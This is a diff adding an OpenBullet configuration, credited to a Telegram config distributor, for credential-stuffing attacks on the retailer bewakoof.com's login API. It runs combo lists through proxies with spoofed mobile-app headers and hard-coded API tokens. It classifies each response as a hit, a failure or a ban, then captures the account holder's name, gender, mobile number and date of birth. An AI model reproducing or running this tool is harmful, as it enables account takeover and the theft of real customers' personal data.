@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "bewakoof.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-21T15:08:12.3114644+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 408352751
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.bewakoof.com/v1/authentication?" 
+  CONTENT "{\"authentication\":{\"password\":\"<PASS>\",\"email\":\"<USER>\",\"referrer_code\":\"\",\"cart\":false}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.bewakoof.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Api-Token: ZmQ2ODBhM2UzMzc0Zjg1YTExZGZmZTM0MTRmNzYyMmY6YTMyODBiM2YtYjczZi00OGFkLWFlZGMtNTVmOTNlYjk4ZGI3" 
+  HEADER "App-Version: 186" 
+  HEADER "Token: 1144269eb297ce63966664e6eb5cba6d" 
+  HEADER "Client-Device-Token: ZmQ2ODBhM2UzMzc0Zjg1YTExZGZmZTM0MTRmNzYyMmY6YTMyODBiM2YtYjczZi00OGFkLWFlZGMtNTVmOTNlYjk4ZGI3" 
+  HEADER "Ab-Id: 20" 
+  HEADER "X-Http-Method-Override: " 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "first_name\"" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login details. Please try again." 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#firstName PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "firstName" 
+
+#lastName PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "lastName" 
+
+#gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "gender" 
+
+#mobile PARSE "<SOURCE>" JSON "mobile" -> VAR "mobile" 
+
+#dob PARSE "<SOURCE>" JSON "date_of_birth" CreateEmpty=FALSE -> CAP "dob" 
+
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/openbulletchannel"
+
